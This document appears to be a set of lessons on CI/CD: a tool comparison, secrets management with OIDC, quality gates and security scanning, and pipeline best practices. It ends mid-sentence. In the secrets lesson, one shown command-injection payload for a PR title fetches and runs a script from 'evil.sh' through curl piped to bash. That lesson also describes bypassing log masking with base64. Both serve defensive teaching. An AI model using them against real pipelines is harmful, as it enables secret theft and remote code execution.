Why there are so many tools All of them do the same core job (run your build, test and deploy steps on a trigger), but they differ along four axes: where they run (SaaS vs self-hosted), how tied they are to a Git host , how they model pipelines (YAML, Groovy, Kubernetes resources), and what they optimise for (flexibility, convenience, Kubernetes-native delivery, GitOps). Knowing the axes lets you pick without chasing hype. Jenkins Jenkins (originally Hudson, 2004-2011) is an open-source automation server written in Java. It is self-hosted, extremely flexible, and has around 2,000 plugins. Its age is both strength and weakness: it can integrate with nearly anything, but it needs care and feeding. ┌─────────────────────────┐ webhook ────▶│ Jenkins controller │ holds config, schedules, UI, credentials (Git push) │ (formerly "master") │ └───────┬─────────┬────────┘ │ agents connect (SSH / inbound JNLP / k8s pods) ┌───────▼───┐ ┌───▼────────┐ ┌─────────────┐ │ agent: │ │ agent: │ │ k8s pod │ │ linux │ │ windows │ │ (ephemeral) │ └───────────┘ └────────────┘ └─────────────┘ Declarative Jenkinsfile Pipelines live in a Jenkinsfile in the repo, written in Groovy-based DSL. The declarative syntax is structured and preferred over the older free-form scripted syntax. pipeline { agent none // each stage picks its own agent options { timeout(time: 30, unit: 'MINUTES') disableConcurrentBuilds() buildDiscarder(logRotator(numToKeepStr: '30')) } environment { IMAGE = "registry.example.com/shop:${env.GIT_COMMIT}" } stages { stage('Lint & Test') { agent { docker { image 'node:22-alpine' } } steps { sh 'npm ci' sh 'npm run lint' sh 'npm test' } post { always { junit 'junit.xml' } // publish test results } } stage('Build image') { when { branch 'main' } // only on main agent { label 'docker' } steps { withCredentials([usernamePassword( credentialsId: 'registry-creds', usernameVariable: 'REG_USER', passwordVariable: 'REG_PASS')]) { sh ''' echo "$REG_PASS" | docker login registry.example.com -u "$REG_USER" --password-stdin docker build -t "$IMAGE" . docker push "$IMAGE" ''' } } } stage('Approve production') { when { branch 'main' } steps { timeout(time: 1, unit: 'HOURS') { input message: 'Deploy to production?', ok: 'Deploy' } } } stage('Deploy') { when { branch 'main' } agent { label 'deployer' } steps { sshagent(credentials: ['deploy-ssh-key']) { sh 'ssh deploy@prod.example.com "IMAGE=$IMAGE /opt/shop/deploy.sh"' } } } } post { failure { slackSend channel: '#ci', message: "FAILED: ${env.JOB_NAME} #${env.BUILD_NUMBER}" } } } Key ideas: agent says where to run (a label, or a Docker image); when conditions stages; post runs cleanup/notifications; withCredentials injects secrets from Jenkins' credential store and masks them in logs; input implements a manual approval; Multibranch Pipeline jobs auto-discover branches and PRs that contain a Jenkinsfile. Shared libraries (Groovy code in a separate repo) hold common steps for many pipelines. Jenkins in practice Pros: total control; runs anywhere (air-gapped, on-prem); works with any SCM; massive plugin ecosystem; free. Cons: you operate it (upgrades, backups, scaling agents, security patches); plugin sprawl and compatibility; Groovy sandbox quirks; UI shows its age; the controller is a high-value target. Best practice: keep config as code (Jenkins Configuration as Code plugin), run builds only on ephemeral agents (never on the controller), use Kubernetes plugin pods, keep plugins few and updated, back up JENKINS_HOME , put it behind SSO and HTTPS. CircleCI A hosted CI/CD SaaS (self-hosted runners available) known for speed, good caching/parallelism and Docker-first design. Config is .circleci/config.yml and uses orbs (shareable config packages). version: 2.1 orbs: node: circleci/node@6 jobs: test: docker: - image: cimg/node:22.9 steps: - checkout - node/install-packages # includes caching - run: npm test workflows: main: jobs: - test - deploy: requires: [test] filters: {branches: {only: main}} Choose it for: very fast hosted CI independent of your Git host, strong test splitting and insights. Watch for: credit-based pricing, and the 2023 security incident that reminded everyone to rotate secrets held in any CI vendor. Other hosted and platform-native options Bitbucket Pipelines: built into Bitbucket; simple YAML; natural for Atlassian shops. Azure Pipelines (Azure DevOps): YAML multi-stage pipelines, strong Windows/.NET and enterprise governance. AWS CodePipeline/CodeBuild, Google Cloud Build: cloud-native, great IAM integration, less portable. Buildkite: hosted control plane, you run the agents; popular for large, performance-sensitive monorepos. Drone / Woodpecker CI, Concourse: container-native, lightweight, self-hosted; Concourse is resource-and-pipeline oriented. Dagger: pipelines written in real code (Go, Python, TypeScript) that run identically locally and in any CI, with built-in caching. Reduces CI lock-in. Kubernetes-native: Tekton Tekton defines CI/CD as Kubernetes custom resources: Task (a series of container steps), Pipeline (tasks wired together), PipelineRun (one execution). Everything runs as pods. apiVersion: tekton.dev/v1 kind: Pipeline metadata: {name: build-and-test} spec: tasks: - name: test taskRef: {name: npm-test} - name: build-image runAfter: [test] taskRef: {name: buildah} Pros: cloud-native, scalable, vendor-neutral, a foundation for platforms (it underlies several products). Cons: verbose YAML, steep learning curve, you must build the UX and triggers (Tekton Triggers) yourself. Argo: Workflows, Events and (most importantly) Argo CD The Argo project is several tools, and naming confuses people: Tool Role Argo CD Continuous delivery via GitOps: watches a Git repo of Kubernetes manifests (or Helm/Kustomize) and continuously reconciles the cluster to match. It does not build or test code. Argo Workflows Container-native workflow engine for Kubernetes (CI-like jobs, data/ML pipelines as DAGs). Argo Rollouts Progressive delivery: canary, blue-green, automated analysis and rollback. Argo Events Event-driven triggering of workflows. The common modern pattern splits CI from CD: CI (GitHub Actions / GitLab / Jenkins) CD (GitOps: Argo CD or Flux) ┌──────────────────────────────┐ ┌───────────────────────────────┐ │ test, build, scan, push image │──▶ update ───▶│ config repo: image: shop:3f9a1 │ │ registry/shop:3f9a1c2 │ image tag │ ▲ watches (pull) │ └──────────────────────────────┘ in config │ Argo CD ─▶ applies to cluster │ repo └───────────────────────────────┘ Benefits: the cluster pulls its desired state, so CI needs no cluster credentials; Git is the audit log and rollback is git revert ; drift is detected and corrected. The Infrastructure as Code section covers GitOps in depth. Flux is the main alternative to Argo CD. Comparison Tool Hosting Config Strength Weakness GitHub Actions SaaS (+ self-hosted runners) YAML Ecosystem, GitHub integration GitHub lock-in; third-party action risk GitLab CI SaaS or self-managed YAML All-in-one platform Best when you use the whole GitLab Jenkins Self-hosted Groovy Jenkinsfile Flexibility, on-prem, plugins Operational burden CircleCI SaaS (+ runners) YAML + orbs Speed, parallelism Cost model; another vendor Buildkite Hybrid YAML / dynamic Scale, you control agents You run agents Tekton In your k8s cluster K8s CRDs Cloud-native building block Complexity, DIY UX Argo CD In your k8s cluster K8s manifests in Git GitOps CD, drift correction Not a CI tool; k8s only Cloud-native (CodeBuild, Cloud Build, Azure Pipelines) Cloud SaaS YAML/console IAM integration, no infra Cloud lock-in How to choose Start where your code lives. GitHub repo: Actions. GitLab: GitLab CI. Bitbucket: Pipelines. Integration beats feature checklists. Do you need self-hosting or air-gapped? Jenkins, GitLab self-managed, Buildkite agents, Tekton. Do you deploy to Kubernetes? Consider a CI tool for build/test plus Argo CD/Flux for delivery. Scale and speed? Large monorepos or heavy test suites may justify Buildkite, CircleCI, or remote build caches (Bazel, Nx). Team capacity. Self-hosting means someone owns uptime and security. Small teams should prefer SaaS. Minimise lock-in by keeping logic in scripts, Makefiles or Dagger modules, with the CI file only orchestrating. Then migrating tools is a rewrite of a thin YAML file. The tool matters less than you think The practices (small changes, fast tests, build once, safe rollout) are tool-independent. A well-designed pipeline on Jenkins beats a sloppy one on the shiniest platform. Do not migrate tools to fix a process problem. Pitfalls Running two CI systems "temporarily" for years. Click-configured Jenkins jobs with no Jenkinsfile: undocumented, unreviewable. Running builds on the Jenkins controller itself (security and stability risk). Treating Argo CD as a CI tool, or expecting GitOps tools to build images. Putting complex logic in plugin-specific syntax that cannot be run locally. Try it Run Jenkins locally: docker run -p 8080:8080 -v jenkins_home:/var/jenkins_home jenkins/jenkins:lts-jdk17 , finish the setup wizard, and create a Pipeline job from a Jenkinsfile in a repo. Port your GitHub Actions workflow (or the example above) to GitLab CI or CircleCI. Note what concepts map one-to-one and what does not. Move the commands out of the YAML into a Makefile ( make test , make build ), and have the CI file call only those targets.

title: Secrets in Pipelines
text: Secrets in Pipelines A CI/CD pipeline is the most privileged automation in your company: it can read your source, publish to your registry and deploy to production. That makes it one of the most attractive targets for attackers. This lesson covers how to give pipelines the access they need, and nothing more. Why this matters Recent supply-chain incidents share a pattern: attackers did not break production, they broke the path to production. In 2021 a flaw in Codecov's uploader script exfiltrated CI environment variables from thousands of customers. In 2023 a breach at CircleCI forced customers to rotate every secret stored there. In 2025 the compromise of the popular tj-actions/changed-files GitHub Action leaked secrets from the logs of many repositories that used it by a mutable tag. In each case, a long-lived credential sitting in a pipeline was the prize. The lesson is a design principle: assume the pipeline will, at some point, run something you did not intend (a malicious dependency, a compromised action, a hostile pull request), and limit the damage in advance. What counts as a secret API keys, tokens, passwords, database credentials. Cloud access keys; SSH private keys; signing keys (GPG, cosign, code-signing certificates). Registry and package-publishing tokens (npm, PyPI, Docker Hub). Webhook URLs with embedded tokens, and anything that grants access when leaked. Configuration (a region name, a hostname) is not secret; keep it as plain variables so it is visible and diffable. The hierarchy of approaches (best to worst) No secret at all: workload identity / OIDC. The pipeline proves who it is; the cloud issues short-lived credentials. Fetch short-lived secrets at runtime from a dedicated secrets manager (Vault, AWS Secrets Manager, GCP Secret Manager, Azure Key Vault), authenticated via OIDC. CI platform secret store (GitHub/GitLab secrets), scoped to environments and rotated regularly. Hard-coded in the repo or in the image. Never. Not even in a private repo. OIDC: replacing long-lived keys With OpenID Connect federation, each job gets a signed JWT from the CI provider containing claims about the run. The cloud verifies the signature and claims against a trust policy and returns temporary credentials (typically valid about an hour). CI job ──(1) request OIDC token──▶ CI provider (token.actions.githubusercontent.com) │◀──(2) JWT: iss, sub="repo:acme/shop:ref:refs/heads/main", aud, exp ──┘ │ └─(3) present JWT ──▶ Cloud STS (AWS / GCP / Azure) │ validates signature + trust policy conditions on sub/aud ◀─(4) temporary credentials (expire in ~1 hour) ─────┘ └─(5) call cloud APIs with them AWS trust policy for the role assumed by GitHub Actions, scoped to one repo and branch: { "Version": "2012-10-17", "Statement": [{ "Effect": "Allow", "Principal": {"Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"}, "Action": "sts:AssumeRoleWithWebIdentity", "Condition": { "StringEquals": { "token.actions.githubusercontent.com:aud": "sts.amazonaws.com", "token.actions.githubusercontent.com:sub": "repo:acme/shop:environment:production" } } }] } Always constrain sub . An unconstrained trust policy lets any GitHub repository assume your role. GitLab ( id_tokens ), Bitbucket, CircleCI and others support the same pattern. Why OIDC wins A leaked OIDC-derived credential expires in an hour and is bound to one repo and environment. A leaked static AWS_SECRET_ACCESS_KEY works from anywhere, forever, until somebody notices. Using the platform secret store correctly GitHub steps: - name: Call API env: API_TOKEN: ${{ secrets.API_TOKEN }} # expose to ONE step, via env run: curl -fsS -H "Authorization: Bearer $API_TOKEN" https://api.example.com/deploy Scope: organisation, repository, or environment secrets. Prefer environment secrets for production: they are released only to jobs that reference that environment and pass its protection rules. Secrets are not passed to workflows triggered from forked PRs (a deliberate protection). Do not circumvent it with pull_request_target plus checkout of PR code. Limit the scope of the secret to the step that needs it, not the whole job, and never to the whole workflow. GitLab Mark variables Masked and Protected (only on protected branches/tags), and scope them to an environment ( production ). Use the secrets: keyword with HashiCorp Vault, Azure Key Vault, GCP Secret Manager or AWS integrations via ID tokens. Jenkins Use the Credentials store with withCredentials ; scope credentials to folders; avoid echo ing them, and prefer single-quoted sh '...' so Groovy does not interpolate secrets into command lines. Masking: helpful but not a security boundary CI systems replace known secret values in logs with *** . This stops accidental exposure, but: It only matches the exact string. Base64, URL-encoded, split, reversed or sliced values slip through. Anyone able to modify the workflow can simply echo "$SECRET" | base64 and read it from the log. Whoever can edit the pipeline can read the secrets it receives. Hence CODEOWNERS and required reviews on pipeline files. Multi-line secrets and structured JSON often need per-line masking registration ( ::add-mask:: in GitHub). set -x and verbose flags ( curl -v , docker --debug ) can print credentials. Least privilege Separate identities per purpose: a CI role that can push to the registry should not be able to deploy; the deploy role should not be able to modify IAM. Per environment: staging credentials cannot touch production. A compromised PR pipeline must not reach prod. Scoped tokens: a registry token limited to one repository with push-only rights; a deploy key (read-only) rather than a personal access token tied to a person. GITHUB_TOKEN: set permissions: contents: read at the top and grant extra ( packages: write , id-token: write ) only to the jobs needing them. GitHub lets you set the repository default to read-only. No personal credentials in pipelines; use service accounts, so offboarding a person does not break deploys and so audit logs make sense. Short TTLs and rotation: rotate static secrets on a schedule and immediately after any suspected exposure. Separate untrusted from trusted Pipeline Code origin Secrets? PR from a fork Untrusted None (read-only token). Run tests only. PR from a branch in the repo Semi-trusted (team members) Low-privilege only (e.g. test credentials, preview environment) Push to main / tag Reviewed and merged Publish and deploy credentials, via protected environments Also protect against script injection . This is vulnerable: # BAD: attacker names the PR: a"; curl evil.sh | bash; echo " - run: echo "PR title is ${{ github.event.pull_request.title }}" # GOOD: pass through an environment variable; the shell treats it as data - env: TITLE: ${{ github.event.pull_request.title }} run: echo "PR title is $TITLE" Supply-chain risks and pinning Every uses: , include: , orb, plugin, base image and npm install is third-party code running with your pipeline's privileges. Pin actions to a full commit SHA , with a comment for humans. Tags and branches are mutable; a maintainer account takeover can repoint v4 to malware. - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2 Use Dependabot or Renovate to bump pinned SHAs via reviewed PRs. Actions published by GitHub or well-known orgs carry lower (not zero) risk than random Marketplace actions; fork or vendor critical ones. Pin container images by digest ( node:22-alpine@sha256:... ) for builds that matter, and rebuild regularly for security patches. Lockfiles and integrity hashes for dependencies; install with npm ci , pip install --require-hashes , go mod verify . Do not curl | bash installers inside pipelines without pinning and checksum verification. Restrict network egress on runners where feasible (tools like StepSecurity Harden-Runner), so a compromised step cannot phone home. Ephemeral runners. Self-hosted runners that persist between jobs leak files and credentials from one job to the next; use one-job-per-VM/pod. Generate provenance and sign artifacts (SLSA provenance, Sigstore cosign, GitHub artifact attestations) so deploy-time checks can verify an image was built by your pipeline from a specific commit. Beware of cache poisoning : a PR job that writes to a cache later restored by a privileged main-branch job can inject code. Scope caches by branch or do not restore PR caches in release jobs. Secrets that must not end up in the artifact Do not bake secrets into Docker images with ARG / ENV ; they persist in layers and docker history . Use BuildKit secret mounts: docker build --secret id=npmrc,src=$HOME/.npmrc . # Dockerfile: # RUN --mount=type=secret,id=npmrc,target=/root/.npmrc npm ci Inject runtime secrets at deploy time (Kubernetes Secrets synced from a manager via External Secrets Operator or CSI driver; docker run --env-file ), never at build time. Detecting leaks and responding Enable secret scanning with push protection (GitHub) or secret detection (GitLab), and run gitleaks / trufflehog in CI and as a pre-commit hook. If a secret leaks, treat it as compromised: revoke and rotate first, then clean up history (history rewrites do not un-leak something already cloned or scraped), then audit logs for use of the credential. Keep an inventory of what secrets exist, who owns them and when they were last rotated. Trade-offs Approach Security Effort OIDC federation Best One-time trust setup per cloud; some tools lack support External secrets manager (Vault etc.) Very good: dynamic secrets, audit, rotation Another system to run and secure CI platform secrets Good if scoped and rotated Lowest; secrets live inside the CI vendor SHA-pinning everything Strong against tag hijack Needs automated update PRs or it rots Checklist No long-lived cloud keys in CI. Default token read-only. Environment-scoped, protected secrets. Fork PRs get nothing. Actions pinned by SHA. Pipeline files under CODEOWNERS. Ephemeral runners. Secret scanning on. Rotation procedure written down and practiced. Try it Audit one repo: list every secret in its CI settings. For each, who created it, does it expire, can it be replaced with OIDC? Set up GitHub OIDC to a free-tier cloud account with a trust policy restricted to one repo and environment. Verify that a different repo cannot assume the role. Run gitleaks detect on your repo and its history. Pin all actions in a workflow to SHAs and add a Dependabot github-actions ecosystem entry to keep them current.

title: Testing and Quality Gates
text: Testing and Quality Gates A pipeline is only as trustworthy as the checks in it. A quality gate is an automated decision: "this change may proceed, or it may not". This lesson covers which checks to run, what each is good for, and how to turn them into gates that protect production without strangling developers. Why gates? Without automatic gates, quality depends on individual diligence: reviewers noticing a missing test, someone remembering to run the security scan, a manager eyeballing coverage. Humans are inconsistent, especially at 6 p.m. on release day. Gates move the minimum bar from "people usually remember" to "the merge button is disabled until it is met". That is what lets you deploy often without gambling. The layers of checking cheap/fast ─────────────────────────────────────────────────────▶ expensive/slow format lint types unit integration contract e2e perf DAST manual/exploratory │ │ │ │ │ │ │ │ │ └───────┴─────┴──────┴──────┴─ every push ─────────┘ └ nightly / pre-release ┘ security (parallel): secrets scan · dependency scan · SAST · container/IaC scan · SBOM Functional testing Type Scope Runs against Example Unit One function/class, dependencies faked Nothing external Price calculator returns correct total with discount Integration Component plus real collaborator (DB, queue, HTTP) Containers started in CI (Testcontainers, service containers) Repository saves and loads an order from real Postgres Contract Agreement between services Pact / OpenAPI schema checks Consumer's expected response shape still matches provider End-to-end (E2E) Whole system through the UI/API Deployed staging or preview env Playwright logs in, adds to cart, pays with test card Smoke Tiny set of "is it alive" checks Right after every deploy GET /healthz returns 200; login page loads Performance / load Latency and throughput under load Staging, scheduled k6: p95 < 300 ms at 200 rps Keep the pyramid shape: many unit, some integration, a handful of E2E for critical journeys (sign-up, checkout). Use Testcontainers or CI service containers so integration tests run against real databases rather than mocks that lie about SQL behavior. Test quality beats test quantity Deterministic: no sleeping for arbitrary times, no dependence on test order, the current date, or random data without a seed. Isolated: each test creates and cleans its own data. Meaningful: assert on behavior, not implementation details. Fast: slow tests are tests nobody runs. Code quality: lint, format, types Formatters (Prettier, Black, gofmt): remove style debates; run in "check" mode in CI ( prettier --check . ). Linters (ESLint, ruff, golangci-lint, Checkstyle): catch bug patterns, unused code, bad practices. Type checkers (TypeScript tsc --noEmit , mypy, pyright): eliminate whole bug classes before runtime. Other linters: hadolint (Dockerfile), actionlint (workflows), shellcheck (bash), yamllint , tflint (Terraform), commitlint . These are the cheapest gate: run them first, fail in seconds. Coverage Code coverage measures which lines/branches the tests execute. It is useful as a negative signal (untested code is definitely unprotected) and weak as a positive one (executing a line is not the same as asserting it works). Set a floor (e.g. fail if overall coverage drops below 70%) and, more usefully, a patch/diff coverage requirement (new code must be at least 80% covered) via Codecov, Coveralls or SonarQube. This prevents decline without demanding the legacy code be fixed at once. Do not chase 100%. Past a point it incentivises meaningless tests (Goodhart's law: when a measure becomes a target it ceases to be a good measure). Mutation testing (Stryker, PIT, mutmut) tells you whether tests would actually notice injected bugs; run it periodically on critical modules. # Jest: fail the build below thresholds (package.json) "jest": { "coverageThreshold": { "global": {"branches": 70, "functions": 75, "lines": 80, "statements": 80} } } Security scanning ("shift left") Finding a vulnerability in a PR costs minutes; finding it in production costs an incident. Layer these automated scanners: Kind What it checks When Tools Secret scanning Credentials in code and history Pre-commit, every PR gitleaks, trufflehog, GitHub push protection SCA / dependency scanning Known CVEs in libraries Every PR + daily schedule (new CVEs appear after merge) Dependabot, Renovate, npm audit , OSV-Scanner, Snyk, Trivy SAST (static) Insecure patterns in your own code (injection, weak crypto) Every PR CodeQL, Semgrep, SonarQube Container / image scanning OS packages and libs in the image After build, before publish; plus registry rescans Trivy, Grype, ECR/Artifact Registry scanning IaC scanning Misconfigurations (open S3, 0.0.0.0/0 SG) Every PR touching infra Checkov, tfsec/Trivy, kube-linter DAST (dynamic) Attacks a running app (XSS, auth flaws) Against staging, nightly or pre-release OWASP ZAP, Burp License compliance Incompatible OSS licenses Every PR FOSSA, license-checker , Trivy SAST vs DAST SAST reads source without running it: early, precise about location, but prone to false positives and blind to runtime/config issues. DAST probes the running app from outside like an attacker: finds real exploitable behavior, but slower, needs a deployed environment, and gives less precise code locations. They are complementary. # Trivy: fail the pipeline on HIGH/CRITICAL fixable vulnerabilities in the image trivy image --severity HIGH,CRITICAL --ignore-unfixed --exit-code 1 ghcr.io/acme/shop:${SHA} # GitHub: CodeQL (SAST) workflow step - uses: github/codeql-action/init@v3 with: {languages: javascript-typescript} - uses: github/codeql-action/analyze@v3 Make security findings actionable A gate that blocks on 400 legacy findings gets disabled within a week. Start by blocking only on new findings and Critical/High severity with a fix available, keep a baseline for the rest, and burn it down on a schedule. Allow time-boxed, documented exceptions (a .trivyignore entry with an expiry and owner). SBOM and provenance A Software Bill of Materials is a machine-readable inventory of every component in your artifact (formats: SPDX, CycloneDX). Why: when the next Log4Shell lands, you can answer "which of our 300 services contain this library?" in seconds rather than days. Regulations and customers (US executive order 14028, EU Cyber Resilience Act) increasingly require them. # generate an SBOM for an image and attach it as an attestation syft ghcr.io/acme/shop:${SHA} -o spdx-json=sbom.spdx.json cosign attest --yes --predicate sbom.spdx.json --type spdxjson ghcr.io/acme/shop@${DIGEST} # keyless signing in CI (uses OIDC identity) cosign sign --yes ghcr.io/acme/shop@${DIGEST} Pair the SBOM with signatures and provenance (SLSA, GitHub artifact attestations). Then a Kubernetes admission policy (Kyverno, Sigstore policy-controller) can refuse to run images that were not built and signed by your pipeline. Gates in practice 1. Required status checks (branch protection) The enforcement point. In GitHub rulesets or branch protection, mark the jobs lint , test , build , codeql as required. The merge button stays disabled until they pass. Remember that a skipped job can count as passing; use a single final "gate" job that needs all others and is the only required check: ci-gate: if: always() needs: [lint, test, build, codeql] runs-on: ubuntu-latest steps: - name: Fail if any required job failed or was cancelled run: | echo '${{ toJSON(needs) }}' | jq -e 'all(.[]; .result == "success")' 2. Review gates Required approvals, CODEOWNERS, "dismiss stale approvals", and resolving all conversations. 3. Deployment gates Environment protection rules (reviewers, wait timers, allowed branches). Smoke tests that must pass before traffic shifts; canary analysis comparing error rate and latency with the baseline (Argo Rollouts, Flagger). SLO/error-budget checks: block risky deploys if the budget is exhausted. Change-freeze calendars for holidays or peak events. 4. Quality platforms SonarQube/SonarCloud, Codacy or CodeClimate combine coverage, duplication, complexity, code smells and security hotspots into a single "quality gate" with pass/fail conditions on new code ("clean as you code"). Designing a good gate Fast. A gate that takes 40 minutes is skipped or worked around. Reliable. False failures train people to hit "re-run". Gate on stable checks; quarantine flaky ones. Clear. Error messages say what to fix and how. Proportionate. Block on what is truly dangerous; warn on the rest. Incremental. Apply thresholds to new code, ratchet them up over time. Owned. Someone maintains rules and exceptions. Pitfalls Coverage worship: tests without assertions that exist to satisfy the percentage. Scanner noise: unfiltered findings lead to alert fatigue and ignored results. Gates on the wrong branch: checks that only run after merge cannot protect main. Admin bypass of required checks becoming routine. Only scanning at merge: new CVEs are published daily; schedule rescans of what you already shipped. Mocked-everything tests that pass while the real integration is broken. E2E suites on every PR that take 40 minutes and flake. Keep a small smoke subset on PRs; full suites after merge. Try it Add npm audit --audit-level=high (or pip-audit ) and gitleaks as parallel jobs in your CI. Run trivy image on a public image such as node:22 and compare with node:22-alpine . What do you learn about base image choice? Generate an SBOM with syft for one of your images and search it for a package name ( jq ). Configure branch protection to require your CI gate job, then open a PR that breaks lint and confirm you cannot merge.

title: Pipeline Best Practices and Anti-Patterns
text: Pipeline Best Practices and Anti-Patterns Building a first pipeline is easy. Keeping it fast, trusted and maintainable for years, with dozens of engineers and hundreds of repos, is the real craft. This lesson collects the practices that separate pipelines people love from pipelines people route around. Why pipelines decay A pipeline is a product with users: your developers. Like any product it accumulates debt. Tests get slower one at a time. A flaky test is "retried" until it is normal. Someone copies a workflow into 40 repos and the copies drift. Nobody owns it. Eventually engineers merge without waiting, or bypass the system, and you have lost the safety you built it for. The principles below are how you prevent that. Best practices 1. Treat the pipeline as code Definitions in Git, reviewed via PR, tested on branches. No click-configured jobs. Keep logic in scripts you can run locally ( make ci , ./scripts/test.sh , npm run ); keep the CI file a thin orchestrator. Developers should reproduce a failure on their laptop without pushing 12 "fix ci" commits. Lint your pipeline code ( actionlint , GitLab CI Lint, hadolint , shellcheck ). Share via reusable workflows, templates, components or shared libraries; version and pin them. 2. Keep it fast Technique Typical win Run cheap checks first, fail fast Seconds to failure instead of minutes Parallelise independent jobs; shard long suites Time = longest branch, not the sum Cache dependencies and Docker layers (order Dockerfile: dependency manifests before source) Minutes saved per run Run only affected tests/builds (path filters, Nx/Turborepo/Bazel) Large in monorepos Cancel superseded runs Saves cost and queue time Bigger or faster runners for the hot path Cheap compared to waiting engineers Move slow tests off the PR path (post-merge, nightly) Fast PR feedback, still covered Set an explicit budget , for example "PR feedback under 10 minutes, p90", measure against it, and treat regressions like bugs. 3. Build once, promote the artifact One immutable, uniquely identified artifact (image digest) flows through every environment. Environment differences are injected configuration. Deploy by SHA or digest, never latest . 4. Make runs reproducible Pin tool versions ( .nvmrc , .tool-versions , base image digests), use lockfiles and npm ci . Run in containers or clean ephemeral runners; no state carried over between runs. Avoid depending on external services you do not control (flaky mirrors); use proxies/caches for registries. 5. Fail loudly and clearly set -euo pipefail in shell steps so errors stop the job. Set timeout-minutes everywhere. Upload logs, test reports and screenshots/videos as artifacts; surface results in the PR (annotations, JUnit summaries). Notify the owner, not a firehose channel. Alert fatigue kills attention. 6. Own it Assign owners (a platform or developer-experience team), define SLOs for the pipeline itself (availability, queue time, p90 duration), and review them regularly. Keep a changelog of pipeline changes. Anti-pattern: flaky tests A flaky test passes and fails on the same code. It is the most corrosive pipeline problem because it destroys trust: when red may mean nothing, people stop reading red. Common causes: timing and race conditions ( sleep(2) ), shared state or order dependence, reliance on wall-clock time or timezone, unseeded randomness, un-awaited async work, port collisions, network calls to real third parties, resource contention on shared runners, test data left by previous tests. What to do: Measure it. Track per-test failure-then-pass-on-retry rates (most CI vendors and tools like BuildPulse or Datadog CI Visibility report this). Quarantine fast. Move a flaky test to a non-blocking job and file a ticket with an owner and a deadline. A quarantined test with no owner is a deleted test. Fix the cause, not the symptom: wait on conditions (poll for readiness) rather than fixed sleeps; inject a fake clock; isolate data per test; mock third parties at the network edge. Retries are a bandage. A limited retry (once) for E2E tests can be pragmatic, but report retried-then-passed tests as flaky, and never blanket-retry whole pipelines. Reproduce with repetition: run the test 100 times in a loop or with --repeat-each ; run it under CPU constraints. The cost of "just re-run it" If 5% of runs fail spuriously and a PR needs 6 checks to pass, a large fraction of PRs fail at least once for no reason. Multiply by developers and wait times: flakiness silently taxes lead time, and teaches people that red is normal. Anti-pattern: slow pipelines Symptoms: PRs sit for 40 minutes; developers batch commits; "I'll merge while it's running". Diagnose: find the critical path; use the platform's timing view; identify the top three slow steps (usually dependency install, test suites, Docker builds). Fix: see the table above. Also remove duplicate work (building the same thing in three jobs), trim image sizes, use multi-stage Docker builds with layer caching, and split the monolith pipeline into per-package pipelines. More anti-patterns Anti-pattern Why it hurts Instead Rebuilding per environment Prod runs something never tested Build once, promote Deploying latest Unknowable, unrollbackable Immutable SHA/digest tags Long-lived feature branches Integration hell returns Trunk-based + flags Manual steps in the "automated" flow Not repeatable; hero dependency Script it; keep only intentional approvals Secrets in repo or baked in images Leaks OIDC, secrets manager, runtime injection Copy-pasted pipelines across repos Drift, painful security updates Reusable workflows/templates, versioned Snowflake CI server configured by hand Cannot recreate it Config as code, ephemeral runners Ignoring red main Everyone's PRs now fail or are untrustworthy Stop the line: revert first Pipeline passes but tells you nothing (no real tests) False confidence Invest in meaningful tests; review what gates assert No post-deploy verification Broken deploys discovered by users Smoke tests, health checks, canary analysis Tests depend on deploying to a shared staging Queues and clobbering Ephemeral per-PR environments Friday-afternoon freeze as the only safety Safety by fear, bigger batches Fast rollback + progressive rollout Rollbacks: design them before you need them Every deploy must have a tested way back. Options, from fastest to slowest: Feature flag off (seconds): for risky features, the quickest remedy and needs no deploy. Traffic shift back (blue-green swap, canary abort): seconds to a minute. Redeploy the previous artifact ( kubectl rollout undo deployment/shop , or run the deploy workflow with the previous digest): minutes. This is why you keep immutable, versioned artifacts and expose a manual workflow_dispatch with a "version" input. Revert the commit and let the pipeline redeploy ( git revert ): minutes to tens of minutes; leaves a clear history; the default for GitOps. Roll forward with a hotfix: sometimes the only option after a data migration. Databases are the hard part. Code rolls back easily; schema and data do not. Use the expand/contract pattern: first deploy a backward-compatible schema (add nullable column), then deploy code that uses it, and only later remove the old column. Never ship a destructive migration in the same release as the code that stops needing it. # manual rollback workflow (GitHub Actions) on: workflow_dispatch: inputs: image_digest: description: "Previously released image digest to redeploy" required: true # Kubernetes quick rollback kubectl rollout undo deployment/shop kubectl rollout status deployment/shop --timeout=120s Rehearse rollbacks. A rollback procedure that has never been run is a hope, not a procedure. Monorepos A monorepo keeps many projects in one repository. It makes atomic cross-project changes and shared tooling easy, but naive CI (run everything on every change) does not scale. Affected-only builds: compute which packages changed and which depend on them (Nx affected , Turborepo --filter=...[origin/main] , Bazel, Pants, Gradle composite builds). Remote build cache: share task outputs across developers and CI so unchanged work is never redone. Path filters per workflow: on.push.paths in GitHub, rules:changes in GitLab. Beware: required checks that are skipped by path filters can block merges; use the "gate job" pattern. Per-service pipelines generated dynamically (GitLab child pipelines, GitHub reusable workflows with a matrix computed by a first job). Code owners and permissions per directory. Merge queues to keep a busy main green. Polyrepo trades the opposite way: simple, independent pipelines, but cross-repo changes and version coordination are painful. Pick based on team coupling, not fashion. Measure the pipeline and the delivery You cannot improve what you do not measure. Track two families of metrics: Pipeline health Delivery performance (DORA) Duration p50 / p90 (PR and main) Deployment frequency Queue/wait time for runners Lead time for changes Success rate on main Change failure rate Flaky-test rate; retries per run Time to restore service Cost per run / per month Rework rate Time red main stays red (MTTR of the build) Reliability vs SLOs Dashboards: your CI vendor's analytics, Four Keys, Grafana fed by CI webhooks, DX/Swarmia/LinearB-style tools. Review monthly, pick one metric to improve, and avoid using these as individual performance scores (Goodhart again). Cost management Cancel redundant runs; set timeout s; limit matrix size to what is meaningful. Avoid expensive runners (macOS, large) unless needed; prefer Linux and ARM where possible. Autoscale self-hosted runners to zero; use spot/preemptible instances for stateless build agents. Set retention on artifacts, caches and logs. Compare against the cost of developer waiting time: 50 engineers losing 10 minutes per PR per day dwarfs most CI bills. Evolving the pipeline Start simple: lint + test + build on PRs. Add the artifact and deploy to staging on main. Add security scanning and branch protection gates. Add post-deploy verification and approval-gated production. Add progressive delivery and automated rollback; consider continuous deployment. Productise: templates, golden paths, metrics, ownership. Principle recap Small batches. Fast feedback. Build once. Same pipeline for everyone. Trust the red. Make rollback boring. Measure and improve continuously. A review checklist Is PR feedback under ~10 minutes at p90? Does main stay green, and is a red main fixed within the hour? Is there exactly one build per commit, promoted unchanged to prod? Can any engineer reproduce CI locally with one command? Are secrets short-lived, scoped, and absent from fork 